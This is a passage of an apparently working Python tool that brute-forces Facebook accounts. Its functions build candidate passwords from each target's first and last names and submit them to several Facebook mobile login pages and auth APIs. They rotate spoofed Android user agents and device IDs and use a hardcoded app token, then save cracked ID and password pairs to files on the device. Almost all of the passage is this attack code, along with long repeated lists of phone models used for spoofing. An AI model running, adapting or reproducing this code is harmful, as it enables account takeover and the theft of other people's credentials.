5gt-8005","gt-8010","gt-81","gt-810","gt-8105","gt-8110","gt-8220s","gt-8410","gt-9300","gt-9320","gt-93g","gt-a7100","gt-a9500","gt-android","gt-b2710","gt-b5330","gt-b5330b","gt-b5330l","gt-b5330zkainu","gt-b5510","gt-b5512","gt-b5722","gt-b7510","gt-b7722","gt-b7810","gt-b9150","gt-b9388","gt-c3010","gt-c3262","gt-c3310r","gt-c3312","gt-c3312r","gt-c3313t","gt-c3322","gt-c3322i","gt-c3520","gt-c3520i","gt-c3592","gt-c3595","gt-c3782","gt-c6712","gt-e1282t","gt-e1500","gt-e2200","gt-e2202","gt-e2250","gt-e2252","gt-e2600","gt-e2652w","gt-e3210","gt-e3309","gt-e3309i","gt-e3309t","gt-g530h","gt-g930f","gt-h9500","gt-i5508","gt-i5801","gt-i6410","gt-i8150","gt-i8160okltpa","gt-i8160zwlttt","gt-i8258","gt-i8262d","gt-i8268""gt-i8505","gt-i8530baabtu","gt-i8530balcho","gt-i8530balttt","gt-i8550e","gt-i8750","gt-i900","gt-i9008l","gt-i9080e","gt-i9082c","gt-i9082ewainu","gt-i9082i","gt-i9100g","gt-i9100lklcht","gt-i9100m","gt-i9100p","gt-i9100t","gt-i9105uandbt","gt-i9128e","gt-i9128i","gt-i9128v","gt-i9158p","gt-i9158v","gt-i9168i","gt-i9190","gt-i9192","gt-i9192i","gt-i9195h","gt-i9195l","gt-i9250","gt-i9300","gt-i9300i","gt-i9301i","gt-i9303i","gt-i9305n","gt-i9308i","gt-i9500","gt-i9505g","gt-i9505x","gt-i9507v","gt-i9600","gt-m5650","gt-n5000s","gt-n5100","gt-n5105","gt-n5110","gt-n5120","gt-n7000b","gt-n7005","gt-n7100","gt-n7100t","gt-n7102","gt-n7105","gt-n7105t","gt-n7108","gt-n7108d","gt-n8000","gt-n8005","gt-n8010","gt-n8020","gt-n9000","gt-n9505","gt-p1000cwaxsa","gt-p1000m","gt-p1000t","gt-p1010","gt-p3100b","gt-p3105","gt-p3108","gt-p3110","gt-p5100","gt-p5110","gt-p5200","gt-p5210","gt-p5210xd1","gt-p5220","gt-p6200","gt-p6200l","gt-p6201","gt-p6210","gt-p6211","gt-p6800","gt-p7100","gt-p7300","gt-p7300b","gt-p7310","gt-p7320","gt-p7500d","gt-p7500m","samsung","lmy4","lmy47v","mmb29k","mmb29m","lrx22c","lrx22g","nmf2","nmf26x","nmf26x;","nrd90m","nrd90m;","sph-l720","iml74k","imm76d","jdq39","jss15j","jzo54k","kot4","kot49h","kot4sm-t310","ktu84p","sm-a500f","sm-a500fu","sm-a500h","sm-g532f","sm-g900f","sm-g920f","sm-g930f","sm-g935","sm-g950f","sm-j320f","sm-j320fn","sm-j320h","sm-j320m","sm-j510fn","sm-j701f","sm-n920s","sm-t111","sm-t230","sm-t231","sm-t235","sm-t280","sm-t311","sm-t315","sm-t525","sm-t531","sm-t535","sm-t555","sm-t561","sm-t705","sm-t805","sm-t820")
#
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [axe] %s|\033[1;32msuccessfull:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'first',first).replace(f'last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" not a;brand";v="99", "chromium";v="100", "google chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-us,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=false,headers=head)
                        shahin=session.cookies.get_dict().keys()
                        if "c_user" in shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [success] %s | %s'%(ids,pas))
                                #cek_apk(session,coki)
                                open(f'/sdcard/success.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/checkpoint.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.connectionerror:
                time.sleep(20)
        loop+=1
def ffb3(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [axe %s|\033[1;32msuccess:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'first',first).replace(f'last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" not a;brand";v="99", "chromium";v="100", "google chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-us,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=false,headers=head)
                        shahin=session.cookies.get_dict().keys()
                        if "c_user" in shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [success] %s | %s'%(ids,pas))
                                open(f'/sdcard/success.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/checkpoint.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.connectionerror:
                time.sleep(20)
        loop+=1
xxxxx=(f"gt-1015","gt-1020","gt-1030","gt-1035","gt-1040","gt-1045","gt-1050","gt-1240","gt-1440","gt-1450","gt-18190","gt-18262","gt-19060i","gt-19082","gt-19083","gt-19105","gt-19152","gt-19192","gt-19300","gt-19505","gt-2000","gt-20000","gt-200s","gt-3000","gt-414xop","gt-6918","gt-7010","gt-7020","gt-7030","gt-7040","gt-7050","gt-7100","gt-7105","gt-7110","gt-7205","gt-7210","gt-7240r","gt-7245","gt-7303","gt-7310","gt-7320","gt-7325","gt-7326","gt-7340","gt-7405","gt-7550 5gt-8005","gt-8010","gt-81","gt-810","gt-8105","gt-8110","gt-8220s","gt-8410","gt-9300","gt-9320","gt-93g","gt-a7100","gt-a9500","gt-android","gt-b2710","gt-b5330","gt-b5330b","gt-b5330l","gt-b5330zkainu","gt-b5510","gt-b5512","gt-b5722","gt-b7510","gt-b7722","gt-b7810","gt-b9150","gt-b9388","gt-c3010","gt-c3262","gt-c3310r","gt-c3312","gt-c3312r","gt-c3313t","gt-c3322","gt-c3322i","gt-c3520","gt-c3520i","gt-c3592","gt-c3595","gt-c3782","gt-c6712","gt-e1282t","gt-e1500","gt-e2200","gt-e2202","gt-e2250","gt-e2252","gt-e2600","gt-e2652w","gt-e3210","gt-e3309","gt-e3309i","gt-e3309t","gt-g530h","gt-g930f","gt-h9500","gt-i5508","gt-i5801","gt-i6410","gt-i8150","gt-i8160okltpa","gt-i8160zwlttt","gt-i8258","gt-i8262d","gt-i8268""gt-i8505","gt-i8530baabtu","gt-i8530balcho","gt-i8530balttt","gt-i8550e","gt-i8750","gt-i900","gt-i9008l","gt-i9080e","gt-i9082c","gt-i9082ewainu","gt-i9082i","gt-i9100g","gt-i9100lklcht","gt-i9100m","gt-i9100p","gt-i9100t","gt-i9105uandbt","gt-i9128e","gt-i9128i","gt-i9128v","gt-i9158p","gt-i9158v","gt-i9168i","gt-i9190","gt-i9192","gt-i9192i","gt-i9195h","gt-i9195l","gt-i9250","gt-i9300","gt-i9300i","gt-i9301i","gt-i9303i","gt-i9305n","gt-i9308i","gt-i9500","gt-i9505g","gt-i9505x","gt-i9507v","gt-i9600","gt-m5650","gt-n5000s","gt-n5100","gt-n5105","gt-n5110","gt-n5120","gt-n7000b","gt-n7005","gt-n7100","gt-n7100t","gt-n7102","gt-n7105","gt-n7105t","gt-n7108","gt-n7108d","gt-n8000","gt-n8005","gt-n8010","gt-n8020","gt-n9000","gt-n9505","gt-p1000cwaxsa","gt-p1000m","gt-p1000t","gt-p1010","gt-p3100b","gt-p3105","gt-p3108","gt-p3110","gt-p5100","gt-p5110","gt-p5200","gt-p5210","gt-p5210xd1","gt-p5220","gt-p6200","gt-p6200l","gt-p6201","gt-p6210","gt-p6211","gt-p6800","gt-p7100","gt-p7300","gt-p7300b","gt-p7310","gt-p7320","gt-p7500d","gt-p7500m","samsung","lmy4","lmy47v","mmb29k","mmb29m","lrx22c","lrx22g","nmf2","nmf26x","nmf26x;","nrd90m","nrd90m;","sph-l720","iml74k","imm76d","jdq39","jss15j","jzo54k","kot4","kot49h","kot4sm-t310","ktu84p","sm-a500f","sm-a500fu","sm-a500h","sm-g532f","sm-g900f","sm-g920f","sm-g930f","sm-g935","sm-g950f","sm-j320f","sm-j320fn","sm-j320h","sm-j320m","sm-j510fn","sm-j701f","sm-n920s","sm-t111","sm-t230","sm-t231","sm-t235","sm-t280","sm-t311","sm-t315","sm-t525","sm-t531","sm-t535","sm-t555","sm-t561","sm-t705","sm-t805","sm-t820")
def ffb4(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [axe] %s|\033[1;32mok:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'first',first).replace(f'last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" not a;brand";v="99", "chromium";v="100", "google chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-us,en;q=0.9'}
                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=false,headers=head)
                        shahin=session.cookies.get_dict().keys()
                        if "c_user" in shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [success] %s | %s'%(ids,pas))
                                open(f'/sdcard/success.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/checkpoint.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.connectionerror:
                time.sleep(20)
        loop+=1
xxxxx=(f"gt-1015","gt-1020","gt-1030","gt-1035","gt-1040","gt-1045","gt-1050","gt-1240","gt-1440","gt-1450","gt-18190","gt-18262","gt-19060i","gt-19082","gt-19083","gt-19105","gt-19152","gt-19192","gt-19300","gt-19505","gt-2000","gt-20000","gt-200s","gt-3000","gt-414xop","gt-6918","gt-7010","gt-7020","gt-7030","gt-7040","gt-7050","gt-7100","gt-7105","gt-7110","gt-7205","gt-7210","gt-7240r","gt-7245","gt-7303","gt-7310","gt-7320","gt-7325","gt-7326","gt-7340","gt-7405","gt-7550 5gt-8005","gt-8010","gt-81","gt-810","gt-8105","gt-8110","gt-8220s","gt-8410","gt-9300","gt-9320","gt-93g","gt-a7100","gt-a9500","gt-android","gt-b2710","gt-b5330","gt-b5330b","gt-b5330l","gt-b5330zkainu","gt-b5510","gt-b5512","gt-b5722","gt-b7510","gt-b7722","gt-b7810","gt-b9150","gt-b9388","gt-c3010","gt-c3262","gt-c3310r","gt-c3312","gt-c3312r","gt-c3313t","gt-c3322","gt-c3322i","gt-c3520","gt-c3520i","gt-c3592","gt-c3595","gt-c3782","gt-c6712","gt-e1282t","gt-e1500","gt-e2200","gt-e2202","gt-e2250","gt-e2252","gt-e2600","gt-e2652w","gt-e3210","gt-e3309","gt-e3309i","gt-e3309t","gt-g530h","gt-g930f","gt-h9500","gt-i5508","gt-i5801","gt-i6410","gt-i8150","gt-i8160okltpa","gt-i8160zwlttt","gt-i8258","gt-i8262d","gt-i8268""gt-i8505","gt-i8530baabtu","gt-i8530balcho","gt-i8530balttt","gt-i8550e","gt-i8750","gt-i900","gt-i9008l","gt-i9080e","gt-i9082c","gt-i9082ewainu","gt-i9082i","gt-i9100g","gt-i9100lklcht","gt-i9100m","gt-i9100p","gt-i9100t","gt-i9105uandbt","gt-i9128e","gt-i9128i","gt-i9128v","gt-i9158p","gt-i9158v","gt-i9168i","gt-i9190","gt-i9192","gt-i9192i","gt-i9195h","gt-i9195l","gt-i9250","gt-i9300","gt-i9300i","gt-i9301i","gt-i9303i","gt-i9305n","gt-i9308i","gt-i9500","gt-i9505g","gt-i9505x","gt-i9507v","gt-i9600","gt-m5650","gt-n5000s","gt-n5100","gt-n5105","gt-n5110","gt-n5120","gt-n7000b","gt-n7005","gt-n7100","gt-n7100t","gt-n7102","gt-n7105","gt-n7105t","gt-n7108","gt-n7108d","gt-n8000","gt-n8005","gt-n8010","gt-n8020","gt-n9000","gt-n9505","gt-p1000cwaxsa","gt-p1000m","gt-p1000t","gt-p1010","gt-p3100b","gt-p3105","gt-p3108","gt-p3110","gt-p5100","gt-p5110","gt-p5200","gt-p5210","gt-p5210xd1","gt-p5220","gt-p6200","gt-p6200l","gt-p6201","gt-p6210","gt-p6211","gt-p6800","gt-p7100","gt-p7300","gt-p7300b","gt-p7310","gt-p7320","gt-p7500d","gt-p7500m","samsung","lmy4","lmy47v","mmb29k","mmb29m","lrx22c","lrx22g","nmf2","nmf26x","nmf26x;","nrd90m","nrd90m;","sph-l720","iml74k","imm76d","jdq39","jss15j","jzo54k","kot4","kot49h","kot4sm-t310","ktu84p","sm-a500f","sm-a500fu","sm-a500h","sm-g532f","sm-g900f","sm-g920f","sm-g930f","sm-g935","sm-g950f","sm-j320f","sm-j320fn","sm-j320h","sm-j320m","sm-j510fn","sm-j701f","sm-n920s","sm-t111","sm-t230","sm-t231","sm-t235","sm-t280","sm-t311","sm-t315","sm-t525","sm-t531","sm-t535","sm-t555","sm-t561","sm-t705","sm-t805","sm-t820")

def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [axe %s|\033[1;32msuccess:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace(f'first',fn.lower()).replace(f'first',fn).replace(f'last',ln.lower()).replace(f'last',ln).replace(f'name',names).replace(f'name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'davik/2.1.0 (linex; u; android {str(android_version)}.0.0; {str(gtt)} build/{str(gttt)} [fban/fb4a;fbav/{str(application_version)};fbbv/{str(application_version_code)};fbdm/'+'{density=2.0,width=720,height=1280};'+f'fblc/en_us;fbrv/{str(application_version_code)};fbcr/movistar;fbmf/samsung;fbbd/samsung;fbpn/{str(fbs)};fbdv/{str(gtt)};fbsv/7.0;fbop/1;fbca/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_us","client_country_code":"us",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.fb4aauthhandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'authorization':'oauth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'excellent',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=false).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [success] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/success.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/checkpoint.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.connectionerror:
                        time.sleep(10)
                except exception as e:
                        pass
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [axe %s|\033[1;32msuccess:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace(f'first',fn.lower()).replace(f'first',fn).replace(f'last',ln.lower()).replace(f'last',ln).replace(f'name',names).replace(f'name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'davik/2.1.0 (linex; u; android {str(android_version)}.0.0; {str(gtt)} build/{str(gttt)} [fban/fb4a;fbav/{str(application_version)};fbbv/{str(application_version_code)};fbdm/'+'{density=2.0,width=720,height=1280};'+f'fblc/es_cu;fbrv/{str(application_version_code)};fbcr/movistar;fbmf/samsung;fbbd/samsung;fbpn/{str(fbs)};fbdv/{str(gtt)};fbsv/7.0;fbop/1;fbca/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_cu","client_country_code":"cu",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.fb4aauthhandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'authorization':'oauth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'excellent',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=false).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [success] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/success.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/checkpoint.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open(f'/sdcard/checkpoint.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.connectionerror:
                        time.sleep(10)
                except exception as e:
                        pass
def ffb7(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [axe] %s|\033[1;32msuccess:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'first',first).replace(f'last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" not a;brand";v="99", "chromium";v="100", "google chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-us,en;q=0.9'}
                        getlog = session.get(f'https://mobile.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mobile.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=false,headers=head)
                        shahin=session.cookies.get_dict().keys()
                        if "c_user" in shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [successful] %s | %s'%(ids,pas))
                                open(f'/sdcard/success.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/checkpoint.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.connectionerror:
                time.sleep(20)
        loop+=1
xxxxx=(f"gt-1015","gt-1020","gt-1030","gt-1035","gt-1040","gt-1045","gt-1050","gt-1240","gt-1440","gt-1450","gt-18190","gt-18262","gt-19060i","gt-19082","gt-19083","gt-19105","gt-19152","gt-19192","gt-19300","gt-19505","gt-2000","gt-20000","gt-200s","gt-3000","gt-414xop","gt-6918","gt-7010","gt-7020","gt-7030","gt-7040","gt-7050","gt-7100","gt-7105","gt-7110","gt-7205","gt-7210","gt-7240r","gt-7245","gt-7303","gt-7310","gt-7320","gt-7325","gt-7326","gt-7340","gt-7405","gt-7550 5gt-8005","gt-8010","gt-81","gt-810","gt-8105","gt-8110","gt-8220s","gt-8410","gt-9300","gt-9320","gt-93g","gt-a7100","gt-a9500","gt-android","gt-b2710","gt-b5330","gt-b5330b","gt-b5330l","gt-b5330zkainu","gt-b5510","gt-b5512","gt-b5722","gt-b7510","gt-b7722","gt-b7810","gt-b9150","gt-b9388","gt-c3010","gt-c3262","gt-c3310r","gt-c3312","gt-c3312r","gt-c3313t","gt-c3322","gt-c3322i","gt-c3520","gt-c3520i","gt-c3592","gt-c3595","gt-c3782","gt-c6712","gt-e1282t","gt-e1500","gt-e2200","gt-e2202","gt-e2250","gt-e2252","gt-e2600","gt-e2652w","gt-e3210","gt-e3309","gt-e3309i","gt-e3309t","gt-g530h","gt-g930f","gt-h9500","gt-i5508","gt-i5801","gt-i6410","gt-i8150","gt-i8160okltpa","gt-i8160zwlttt","gt-i8258","gt-i8262d","gt-i8268""gt-i8505","gt-i8530baabtu","gt-i8530balcho","gt-i8530balttt","gt-i8550e","gt-i8750","gt-i900","gt-i9008l","gt-i9080e","gt-i9082c","gt-i9082ewainu","gt-i9082i","gt-i9100g","gt-i9100lklcht","gt-i9100m","gt-i9100p","gt-i9100t","gt-i9105uandbt","gt-i9128e","gt-i9128i","gt-i9128v","gt-i9158p","gt-i9158v","gt-i9168i","gt-i9190","gt-i9192","gt-i9192i","gt-i9195h","gt-i9195l","gt-i9250","gt-i9300","gt-i9300i","gt-i9301i","gt-i9303i","gt-i9305n","gt-i9308i","gt-i9500","gt-i9505g","gt-i9505x","gt-i9507v","gt-i9600","gt-m5650","gt-n5000s","gt-n5100","gt-n5105","gt-n5110","gt-n5120","gt-n7000b","gt-n7005","gt-n7100","gt-n7100t","gt-n7102","gt-n7105","gt-n7105t","gt-n7108","gt-n7108d","gt-n8000","gt-n8005","gt-n8010","gt-n8020","gt-n9000","gt-n9505","gt-p1000cwaxsa","gt-p1000m","gt-p1000t","gt-p1010","gt-p3100b","gt-p3105","gt-p3108","gt-p3110","gt-p5100","gt-p5110","gt-p5200","gt-p5210","gt-p5210xd1","gt-p5220","gt-p6200","gt-p6200